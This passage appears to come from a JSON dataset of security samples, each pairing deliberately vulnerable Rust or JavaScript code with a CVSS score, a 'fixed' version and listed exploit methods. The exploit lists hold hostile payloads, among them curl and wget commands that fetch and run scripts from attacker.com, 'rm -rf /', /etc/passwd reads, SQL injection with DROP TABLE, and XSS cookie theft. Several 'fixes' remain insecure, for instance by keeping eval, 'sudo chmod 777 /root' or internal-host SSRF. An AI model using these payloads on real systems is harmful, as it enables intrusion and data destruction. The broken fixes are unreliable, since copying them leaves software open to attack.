            "By exploiting open redirects, attackers can manipulate the redirection to perform actions requiring user interaction, such as authorizing access to their applications."
        ]
    },
    "rust_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "use std::process::Command;\n\nfn fetch_url(url: &str) -> Result<String, std::io::Error> {\n    let output = Command::new(\"curl\")\n        .arg(url)\n        .output()\n        .expect(\"Failed to execute command\");\n\n    if output.status.success() {\n        Ok(String::from_utf8_lossy(&output.stdout).to_string())\n    } else {\n        Err(std::io::Error::new(std::io::ErrorKind::Other, \"Command failed\"))\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use std::process::Command;\n\nfn fetch_url(url: &str) -> Result<String, std::io::Error> {\n    if !url.starts_with(\"http://\") && !url.starts_with(\"https://\") {\n        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, \"URL must start with http:// or https://\"));\n    }\n\n    let output = Command::new(\"curl\")\n        .arg(url)\n        .output()\n        .expect(\"Failed to execute command\");\n\n    if output.status.success() {\n        Ok(String::from_utf8_lossy(&output.stdout).to_string())\n    } else {\n        Err(std::io::Error::new(std::io::ErrorKind::Other, \"Command failed\"))\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'file:///etc/passwd' to read local files.",
            "They could use 'http://localhost:8080/admin' to access internal web services if running on the same host.",
            "Inputting 'gopher://attacker.com/' might allow interaction with external services in unexpected ways."
        ]
    },
    "javascript_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "{\"use strict\";const express=require(\\\"express\\\");const app=express();app.use(express.json());app.post(\\\"/exec\\\",(req,res)=>{try{const {command}=req.body;require(\\\"child_process\\\").exec(command,(error,stdout,stderr)=>{if(error){return res.status(500).json({error:stderr});}res.send(stdout);});}catch(e){res.status(400).send(e.message);}});app.listen(3000,()=>console.log(\\\"Server running on port 3000\\\"));}",
        "cvss_score": 8.6,
        "fixed_code": "{\"use strict\";const express=require(\\\"express\\\");const app=express();const { exec } = require(\\\"child_process\\\");app.use(express.json());app.post(\\\"/exec\\\",(req,res)=>{try{const allowedCommands=[\\\"ls\\\", \\\"whoami\\\"];const {command}=req.body;if(!allowedCommands.includes(command)){return res.status(403).send(\\\"Command not allowed\\\");}exec(command,(error,stdout,stderr)=>{if(error){return res.status(500).json({error:stderr});}res.send(stdout);});}catch(e){res.status(400).send(e.message);}});app.listen(3000,()=>console.log(\\\"Server running on port 3000\\\"));}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files.",
            "They can use 'curl attacker.com/malware.sh | sh' to run malicious scripts.",
            "Chaining commands like 'ls; cat /etc/passwd' could leak sensitive information."
        ]
    },
    "javascript_1": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "class User {\n    constructor(name, isAdmin) {\n        this.name = name;\n        this.isAdmin = isAdmin;\n    }\n\n    promote() {\n        if (this.name === \"admin\") {\n            this.isAdmin = true;\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class User {\n    constructor(name, isAdmin) {\n        this.name = name;\n        this.isAdmin = isAdmin;\n    }\n\n    promote() {\n        if (this.name === \"admin\" && this.isAuthorized()) {\n            this.isAdmin = true;\n        }\n    }\n\n    isAuthorized() {\n        // Implement proper authorization logic here\n        return false; // Placeholder for actual check\n    }\n}",
        "exploit_ways": [
            "An attacker can create a new User object with the name 'admin' and call promote to gain admin privileges.",
            "If user input is used to set the name, an attacker could directly inject 'admin' as their username.",
            "Exploiting any pre-existing vulnerabilities that allow unauthorized manipulation of User objects."
        ]
    },
    "javascript_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "const fs = require('fs');\n\nfunction updateUserRole(userId, role) {\n    if (role !== 'admin') return;\n    const data = JSON.parse(fs.readFileSync('users.json', 'utf8'));\n    const user = data.find(u => u.id === userId);\n    if (!user) return;\n    user.role = role;\n    fs.writeFileSync('users.json', JSON.stringify(data, null, 2));\n}\n\nif (process.argv.length > 3) {\n    updateUserRole(process.argv[2], process.argv[3]);\n}",
        "cvss_score": 7.5,
        "fixed_code": "const fs = require('fs');\n\nfunction updateUserRole(userId, role) {\n    const allowedRoles = ['admin', 'user'];\n    if (!allowedRoles.includes(role)) return;\n    const data = JSON.parse(fs.readFileSync('users.json', 'utf8'));\n    const user = data.find(u => u.id === userId);\n    if (!user) return;\n    user.role = role;\n    fs.writeFileSync('users.json', JSON.stringify(data, null, 2));\n}\n\nif (process.argv.length > 3) {\n    updateUserRole(process.argv[2], process.argv[3]);\n}",
        "exploit_ways": [
            "An attacker can supply an unexpected role value like 'superadmin' to gain unauthorized privileges.",
            "By providing a crafted userId that doesn't exist, the function may not properly handle the error, allowing for potential further exploitation.",
            "Using process injection techniques, an attacker could manipulate command-line arguments to escalate their user's role."
        ]
    },
    "javascript_3": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\napp.use(express.json());\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'testdb'\n});\n\nconnection.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to MySQL database!');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username || '';\n  const password = req.body.password || '';\n  \n  // Complex obfuscation and encoding to make detection harder\n  const encodedUsername = Buffer.from(username).toString('base64');\n  const decodedUsername = Buffer.from(encodedUsername, 'base64').toString();\n  \n  const query = `SELECT * FROM users WHERE username='${decodedUsername}' AND password='${password}'`;\n  \n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "cvss_score": 8.6,
        "fixed_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\napp.use(express.json());\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'testdb'\n});\n\nconnection.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to MySQL database!');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username || '';\n  const password = req.body.password || '';\n  \n  connection.query('SELECT * FROM users WHERE username=? AND password=?', [username, password], (error, results) => {\n    if (error) throw error;\n    if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can send a POST request with 'username=admin' and 'password=' OR '1'='1' to bypass authentication.",
            "They could use SQL injection payloads like 'admin' -- to comment out the rest of the query, potentially granting unauthorized access.",
            "A payload such as 'admin'; DROP TABLE users; -- can be used to delete critical data from the database."
        ]
    },
    "javascript_4": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<script>\nfunction displayUserInput() {\n    var userInput = document.getElementById('userInput').value;\n    document.getElementById('output').innerHTML = userInput;\n}\n</script>\n<input type='text' id='userInput'>\n<button onclick='displayUserInput()'>Submit</button>\n<div id='output'></div>",
        "cvss_score": 6.1,
        "fixed_code": "<script>\nfunction displayUserInput() {\n    var userInput = document.getElementById('userInput').value;\n    document.getElementById('output').textContent = userInput;\n}\n</script>\n<input type='text' id='userInput'>\n<button onclick='displayUserInput()'>Submit</button>\n<div id='output'></div>",
        "exploit_ways": [
            "An attacker can inject a script tag like '<script>alert(\\'XSS\\')</script>' to execute arbitrary JavaScript.",
            "Can use '<img src=x onerror=alert(1)>' to trigger an alert in browsers that do not filter the 'onerror' attribute.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click here</a>' can steal user cookies when clicked."
        ]
    },
    "javascript_5": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseQuery {\\n    constructor(connectionString) {\\n        this.connectionString = connectionString;\\n    }\\n\\n    getUser(userId) {\\n        const query = `SELECT * FROM users WHERE id = ${userId}`;\\n        // Execute the query (vulnerable to SQL injection)\\n        return this.executeQuery(query);\\n    }\\n\\n    executeQuery(query) {\\n        // Simulate database execution\\n        console.log(`Executing: ${query}`);\\n        return {};\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class DatabaseQuery {\\n    constructor(connectionString) {\\n        this.connectionString = connectionString;\\n    }\\n\\n    getUser(userId) {\\n        const query = 'SELECT * FROM users WHERE id = ?';\\n        // Execute the query safely with parameterized queries\\n        return this.executeQuery(query, [userId]);\\n    }\\n\\n    executeQuery(query, params) {\\n        // Simulate database execution with parameters\\n        console.log(`Executing: ${query} with params:`, params);\\n        return {};\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user records.",
            "They could use '1; DROP TABLE users' to delete the users table.",
            "Input like '1 UNION SELECT password FROM admin_users' can extract passwords from another table."
        ]
    },
    "javascript_6": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "const fs = require('fs');\nfunction updateUserRole(userId, role) {\n    const filePath = `/home/user/data/users/${userId}.json`;\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) throw err;\n        const user = JSON.parse(data);\n        if (user.isAdmin && role === 'admin') {\n            user.role = role;\n            fs.writeFile(filePath, JSON.stringify(user), (err) => {\n                if (err) throw err;\n            });\n        }\n    });\n}",
        "cvss_score": 7.8,
        "fixed_code": "const fs = require('fs');\nfunction updateUserRole(userId, role) {\n    const filePath = `/home/user/data/users/${userId}.json`;\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) throw err;\n        const user = JSON.parse(data);\n        if (user.isAdmin && ['admin', 'user'].includes(role)) {\n            user.role = role;\n            fs.writeFile(filePath, JSON.stringify(user), (err) => {\n                if (err) throw err;\n            });\n        }\n    });\n}",
        "exploit_ways": [
            "An attacker with a valid admin account can change their role to 'admin' in the JSON file directly.",
            "By exploiting a path traversal vulnerability, an attacker might be able to modify other user files and escalate privileges.",
            "If the application does not validate input properly elsewhere, an attacker could craft malicious inputs leading to privilege escalation."
        ]
    },
    "javascript_7": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileManager {\\n    readfile(filePath) {\\n        const fs = require('fs');\\n        return fs.readFileSync(filePath, 'utf8');\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileManager {\\n    constructor(basePath) {\\n        this.basePath = basePath;\\n    }\\n    readfile(filePath) {\\n        const fs = require('fs');\\n        const path = require('path');\\n        const fullPath = path.join(this.basePath, filePath);\\n        if (!fullPath.startsWith(this.basePath)) {\\n            throw new Error('Invalid file path');\\n        }\\n        return fs.readFileSync(fullPath, 'utf8');\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '../../etc/passwd' to read the system's passwd file.",
            "They could use '..%2f..%2fetc%2fshadow' URL-encoded path to access shadow file if web application is vulnerable.",
            "By providing '../config/database.ini', an attacker might retrieve sensitive database connection details."
        ]
    },
    "javascript_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.get('/execute', (req, res) => {\n    const command = req.query.cmd;\n    const { exec } = require('child_process');\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n        } else {\n            res.send(stdout);\n        }\n    });\n});\napp.listen(3000);",
        "cvss_score": 7.5,
        "fixed_code": "const express = require('express');\nconst app = express();\nconst { exec } = require('child_process');\nconst allowedCommands = ['ls', 'whoami'];\napp.get('/execute', (req, res) => {\n    const command = req.query.cmd;\n    if (!allowedCommands.includes(command)) {\n        return res.send('Command not allowed');\n    }\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n        } else {\n            res.send(stdout);\n        }\n    });\n});\napp.listen(3000);",
        "exploit_ways": [
            "User could input 'whoami' to get the username of the server.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.",
            "Could use 'rm -rf /' to delete all files on the system."
        ]
    },
    "javascript_9": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "const data = JSON.parse(window.localStorage.getItem('userSettings'));\nconsole.log(data.user.name);",
        "cvss_score": 7.5,
        "fixed_code": "const serializedData = window.localStorage.getItem('userSettings');\ntry {\n    const data = JSON.parse(serializedData);\n    if (data && typeof data.user === 'object' && typeof data.user.name === 'string') {\n        console.log(data.user.name);\n    } else {\n        throw new Error('Invalid data format');\n    }\n} catch (e) {\n    console.error('Failed to parse user settings:', e);\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON that causes a JavaScript error or unexpected behavior.",
            "By crafting the payload, an attacker might execute arbitrary code if additional vulnerabilities exist in the application.",
            "Injecting a large object could cause a denial of service (DoS) by consuming excessive memory resources."
        ]
    },
    "javascript_10": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth {\\n    constructor(username, password) {\\n        this.username = username;\\n        this.password = password;\\n    }\\n\\n    login(inputUsername, inputPassword) {\\n        if (inputUsername === this.username && inputPassword === this.password) {\\n            return true;\\n        } else {\\n            return false;\\n        }\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "const bcrypt = require('bcrypt');\\nclass UserAuth {\\n    constructor(username, password) {\\n        this.username = username;\\n        this.passwordHash = bcrypt.hashSync(password, 10);\\n    }\\n\\n    login(inputUsername, inputPassword) {\\n        return this.username === inputUsername && bcrypt.compareSync(inputPassword, this.passwordHash);\\n    }\\n}",
        "exploit_ways": [
            "An attacker with knowledge of the username can brute-force the password.",
            "If the username is not unique, an attacker could guess common passwords across multiple accounts.",
            "By observing response times during login attempts, an attacker might infer if a username exists."
        ]
    },
    "javascript_11": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet users = [{ username: 'admin', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.json({ message: 'Login successful' });\n    } else {\n        res.status(401).json({ message: 'Invalid credentials' });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "cvss_score": 7.5,
        "fixed_code": "const express = require('express');\nconst bcrypt = require('bcryptjs');\nconst app = express();\napp.use(express.json());\n\nlet users = [{ username: 'admin', password: '$2a$10$cWBbXvUfGdJN4Y5RQlZKtePwzD9.7k6t3cQoWwF8A3kV0e6L0.ATq' }];\n\napp.post('/login', async (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    if (user && await bcrypt.compare(password, user.password)) {\n        res.json({ message: 'Login successful' });\n    } else {\n        res.status(401).json({ message: 'Invalid credentials' });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "exploit_ways": [
            "An attacker can try common password combinations to brute force the login.",
            "Using a rainbow table attack, they could attempt to crack hashed passwords if stored insecurely.",
            "If user enumeration is possible, attackers can gather valid usernames and focus their brute force attempts."
        ]
    },
    "javascript_12": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "const untrustedData = JSON.parse(window.localStorage.getItem('userSettings'));\nif (untrustedData && untrustedData.settings) {\n    Object.assign({}, untrustedData.settings);\n}",
        "cvss_score": 8.1,
        "fixed_code": "const userSettingsString = window.localStorage.getItem('userSettings');\nlet untrustedData = {};\ntry {\n    untrustedData = JSON.parse(userSettingsString);\n} catch (e) {\n    console.error(\"Invalid JSON data\", e);\n}\nif (untrustedData && typeof untrustedData.settings === 'object' && !Array.isArray(untrustedData.settings)) {\n    Object.assign({}, untrustedData.settings);\n}",
        "exploit_ways": [
            "An attacker could store malicious JSON in localStorage to execute arbitrary JavaScript code.",
            "By injecting a payload that overrides expected properties, an attacker can alter application behavior.",
            "A crafted payload might lead to denial of service by causing the application to consume excessive resources."
        ]
    },
    "javascript_13": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "function deserializeUser(data) {\n    const user = JSON.parse(data);\n    return new User(user.name, user.age, user.isAdmin);\n}\nclass User {\n    constructor(name, age, isAdmin) {\n        this.name = name;\n        this.age = age;\n        this.isAdmin = isAdmin;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "function deserializeUser(data) {\n    try {\n        const parsedData = JSON.parse(data);\n        if (typeof parsedData.name === 'string' && typeof parsedData.age === 'number' && typeof parsedData.isAdmin === 'boolean') {\n            return new User(parsedData.name, parsedData.age, parsedData.isAdmin);\n        } else {\n            throw new Error('Invalid data format');\n        }\n    } catch (e) {\n        throw new Error('Failed to deserialize user data: ' + e.message);\n    }\n}\nclass User {\n    constructor(name, age, isAdmin) {\n        this.name = name;\n        this.age = age;\n        this.isAdmin = isAdmin;\n    }\n}",
        "exploit_ways": [
            "An attacker could inject malicious JSON to manipulate user permissions by setting isAdmin to true.",
            "By injecting crafted JSON data, an attacker might be able to execute arbitrary code if the deserialized object is used in unsafe ways elsewhere in the application.",
            "The vulnerability can be exploited to perform privilege escalation attacks by modifying serialized objects that are sent over untrusted networks."
        ]
    },
    "javascript_14": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseConnector {\\n    constructor() {}\\n\\n    queryUserByUsername(username) {\\n        const sql = `SELECT * FROM users WHERE username = '${username}'`;\\n        // Simulate database execution\\n        console.log(sql);\\n        return [];\\n    }\\n}",
        "cvss_score": 8.9,
        "fixed_code": "class DatabaseConnector {\\n    constructor() {}\\n\\n    queryUserByUsername(username) {\\n        const sql = 'SELECT * FROM users WHERE username = $1';\\n        // Use a library like pg-promise or similar for parameterized queries\\n        console.log(sql);\\n        return [];\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to bypass authentication.",
            "They can use \"UNION SELECT password FROM users--\" to extract passwords.",
            "Input like \"; DROP TABLE users; --\" can delete the critical users table."
        ]
    },
    "javascript_15": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "class User {\\n    constructor(data) {\\n        Object.assign(this, data);\\n    }\\n}\\nconst data = JSON.parse('{\"__proto__\":{\"admin\":true}}');\\nconst user = new User(data);",
        "cvss_score": 7.5,
        "fixed_code": "class User {\\n    constructor(data) {\\n        this.username = data.username;\\n        this.email = data.email;\\n        // Add other properties as necessary without using Object.assign\\n    }\\n}\\nconst safeParse = (str) => {\\n    try {\\n        return JSON.parse(str, (key, value) => {\\n            if (typeof value === 'object' && value !== null && !Array.isArray(value)) {\\n                throw new Error('Invalid object structure');\\n            }\\n            return value;\\n        });\\n    } catch (e) {\\n        console.error('Invalid JSON provided', e);\\n        return {};\\n    }\\n};\\nconst data = safeParse('{\"username\":\"test\",\"email\":\"test@example.com\"}');\\nconst user = new User(data);",
        "exploit_ways": [
            "An attacker could inject malicious __proto__ properties to modify global object prototypes, leading to privilege escalation.",
            "By crafting specific JSON inputs, an attacker can manipulate the application's behavior or cause Denial of Service by consuming excessive resources.",
            "Using carefully crafted payloads, an attacker might be able to override critical properties in objects, causing unexpected behavior or unauthorized actions."
        ]
    },
    "javascript_16": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "function exploitUserPermissions() {\\n    if (window.location.hash) {\\n        var cmd = decodeURIComponent(window.location.hash.substring(1));\\n        new Function(cmd)();\\n    }\\n}",
        "cvss_score": 8.5,
        "fixed_code": "function safeExploitUserPermissions() {\\n    if (window.location.hash) {\\n        var allowedCommands = ['allowedCommand1', 'allowedCommand2'];\\n        var cmd = decodeURIComponent(window.location.hash.substring(1));\\n        if (allowedCommands.includes(cmd)) {\\n            // Execute only allowed commands safely\\n            eval(cmd);\\n        } else {\\n            console.log('Unauthorized command');\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject JavaScript code via the URL hash to execute arbitrary code in the user's context.",
            "Could use the injected code to steal cookies or other sensitive information from the user.",
            "Injecting malicious scripts could lead to further privilege escalation, potentially compromising the entire application."
        ]
    },
    "javascript_18": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'testdb'\n});\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id=${userId}`;\n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "cvss_score": 8.0,
        "fixed_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'testdb'\n});\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  connection.query('SELECT * FROM users WHERE id=?', [userId], (error, results) => {\n    if (error) throw error;\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can inject SQL code via the 'id' query parameter to retrieve all user data.",
            "They could use a UNION SELECT statement to access additional tables or data.",
            "A DROP TABLE command can be injected to delete the users table from the database."
        ]
    },
    "javascript_19": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "\"use strict\";\nconst express = require('express');\nconst { exec } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/run-command', (req, res) => {\n    const command = `echo ${req.body.command}`;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "cvss_score": 8.2,
        "fixed_code": "\"use strict\";\nconst express = require('express');\nconst { exec } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/run-command', (req, res) => {\n    const allowedCommands = ['echo'];\n    if (!allowedCommands.includes(req.body.command)) {\n        res.status(403).send('Command not allowed');\n        return;\n    }\n    exec(`echo ${req.body.command}`, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "exploit_ways": [
            "An attacker could input '; rm -rf /' to delete all files on the server.",
            "They can use '; curl http://attacker.com/malware | sh' to execute remote malicious code.",
            "Input like '; cat /etc/passwd' could be used to leak sensitive system information."
        ]
    },
    "javascript_21": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class UserSession {\n    constructor(userId) {\n        this.userId = userId;\n    }\n    changeEmail(newEmail, token) {\n        if (this.validateToken(token)) {\n            // Simulate changing email\n            console.log(`Email changed to ${newEmail} for user ${this.userId}`);\n        } else {\n            throw new Error('Invalid token');\n        }\n    }\n    validateToken(token) {\n        // Simplified and insecure validation logic\n        return token === 'valid_token';\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class UserSession {\n    constructor(userId, csrfToken) {\n        this.userId = userId;\n        this.csrfToken = csrfToken;\n    }\n    changeEmail(newEmail, token) {\n        if (this.validateToken(token)) {\n            // Simulate changing email\n            console.log(`Email changed to ${newEmail} for user ${this.userId}`);\n        } else {\n            throw new Error('Invalid CSRF token');\n        }\n    }\n    validateToken(token) {\n        return token === this.csrfToken;\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious web page that sends a request to change the user's email without their knowledge.",
            "The attacker can use social engineering to trick the victim into clicking a link or visiting a site that triggers the CSRF attack.",
            "If the token validation is predictable, an attacker might guess or brute-force the valid token."
        ]
    },
    "javascript_22": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "function authenticate(user, pass) {\n    const users = {\"admin\": \"secret123\", \"user\": \"password456\"};\n    if (users[user] && pass === users[user]) {\n        return true;\n    }\n    return false;\n}",
        "cvss_score": 7.5,
        "fixed_code": "const bcrypt = require('bcrypt');\n\nfunction authenticate(user, pass) {\n    const users = {\"admin\": \"$2a$10$somesaltsecret123\", \"user\": \"$2a$10$othersaltpassword456\"};\n    if (users[user] && bcrypt.compareSync(pass, users[user])) {\n        return true;\n    }\n    return false;\n}",
        "exploit_ways": [
            "An attacker can use a brute force attack to guess the passwords stored in plain text.",
            "By analyzing the code, an attacker might see that passwords are not hashed and try common credentials.",
            "The vulnerability allows unauthorized access if the attacker finds out or guesses the correct username-password pair."
        ]
    },
    "javascript_23": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "function escalatePrivileges(userInput) { var command = \"sudo \"; if (userInput === 'admin') { command += 'chmod 777 /root'; } else { command += 'echo normal user'; } require('child_process').exec(command, function(error, stdout, stderr) { console.log(stdout); }); }",
        "cvss_score": 8.5,
        "fixed_code": "function escalatePrivileges(userInput) { if (userInput === 'admin') { var command = ['sudo', 'chmod', '777', '/root']; require('child_process').execFile(command[0], command.slice(1), function(error, stdout, stderr) { console.log(stdout); }); } else { console.log('normal user'); } }",
        "exploit_ways": [
            "An attacker could input '; rm -rf /' to delete all files on the system.",
            "They can use '; sudo su -' to gain a root shell immediately.",
            "Exploiting this, an attacker might execute '; wget http://attacker.com/malware.sh; sh malware.sh' to download and run malicious scripts."
        ]
    },
    "javascript_24": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "function authenticate(username, password) {\n    if (username === 'admin' && password === 'password123') {\n        return true;\n    }\n    return false;\n}",
        "cvss_score": 7.5,
        "fixed_code": "function authenticate(username, password) {\n    const validCredentials = { admin: 'hashed_password_here' };\n    if (validCredentials[username] && compareHash(password, validCredentials[username])) {\n        return true;\n    }\n    return false;\n}\n\nfunction compareHash(inputPassword, storedHash) {\n    // Implement a secure hash comparison function here\n}",
        "exploit_ways": [
            "An attacker can use the default 'admin' and 'password123' to gain unauthorized access.",
            "By analyzing the code, an attacker might guess other hardcoded usernames and passwords if they exist.",
            "If using this function in a web application, an attacker could automate login attempts (brute force) to find valid credentials."
        ]
    },
    "javascript_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\n    constructor() {}\n    start() {\n        const express = require('express');\n        const app = express();\n        app.get('/', (req, res) => {\n            res.send('<h1>Hello World</h1>');\n        });\n        app.listen(3000, () => {\n            console.log('Server is running on port 3000');\n        });\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class WebServer {\n    constructor() {}\n    start() {\n        const express = require('express');\n        const helmet = require('helmet');\n        const app = express();\n        app.use(helmet());\n        app.get('/', (req, res) => {\n            res.send('<h1>Hello World</h1>');\n        });\n        app.listen(3000, () => {\n            console.log('Server is running on port 3000');\n        });\n    }\n}",
        "exploit_ways": [
            "An attacker can perform Clickjacking attacks by default due to the lack of X-Frame-Options header.",
            "The server might be vulnerable to Cross-Site Scripting (XSS) as it does not set Content Security Policy headers.",
            "Without proper security headers, the server is susceptible to MIME-sniffing vulnerabilities."
        ]
    },
    "javascript_26": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "function endlessLoop() {\\n    while(true) {}\\n}\\nendlessLoop();",
        "cvss_score": 4.2,
        "fixed_code": "function controlledLoop(maxIterations) {\\n    for (let i = 0; i < maxIterations; i++) {}\\n}\\ncontrolledLoop(1000);",
        "exploit_ways": [
            "An attacker can trigger the endlessLoop function to consume CPU resources, leading to a Denial-of-Service.",
            "If this code is in a web context, it can cause the browser or server to freeze, affecting user experience and availability.",
            "In a multi-threaded environment, such a loop can exhaust system resources, impacting other processes."
        ]
    },
    "javascript_27": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "const http = require('http');\n\nfunction handleRequest(request, response) {\n    let data = '';\n    request.on('data', chunk => {\n        data += chunk.toString();\n    });\n    request.on('end', () => {\n        if (data.length > 1e6) {\n            for (let i = 0; i < 1000000; i++) {}\n        }\n        response.end('Hello World');\n    });\n}\n\nconst server = http.createServer(handleRequest);\nserver.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 4.2,
        "fixed_code": "const http = require('http');\n\nfunction handleRequest(request, response) {\n    let data = '';\n    request.on('data', chunk => {\n        if (data.length > 1e6) {\n            return response.writeHead(413).end();\n        }\n        data += chunk.toString();\n    });\n    request.on('end', () => {\n        response.end('Hello World');\n    });\n}\n\nconst server = http.createServer(handleRequest);\nserver.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can send a large payload to trigger the loop and exhaust CPU resources.",
            "By sending multiple requests with large payloads, the server may become unresponsive to legitimate users.",
            "Crafting specific payloads that exceed the buffer size can cause the server to terminate connections prematurely."
        ]
    },
    "javascript_28": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n    const url = req.query.url;\n    if (url && /^https?:\\/\\/(example\\.com|another\\.example\\.org)/.test(url)) {\n        res.redirect(url);\n    } else {\n        res.status(400).send('Invalid URL');\n    }\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "cvss_score": 6.5,
        "fixed_code": "const express = require('express');\nconst app = express();\n\nconst allowedDomains = ['example.com', 'another.example.org'];\n\napp.get('/redirect', (req, res) => {\n    const url = new URL(req.query.url);\n    if (allowedDomains.includes(url.hostname)) {\n        res.redirect(url.toString());\n    } else {\n        res.status(400).send('Invalid URL');\n    }\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can redirect users to a phishing site by using a valid subdomain of example.com or another.example.org.",
            "Crafting URLs with URL-encoded characters to bypass the regex check and redirect to an unauthorized domain.",
            "Using crafted query strings that exploit browser parsing vulnerabilities to perform redirection to malicious sites."
        ]
    },
    "javascript_29": {
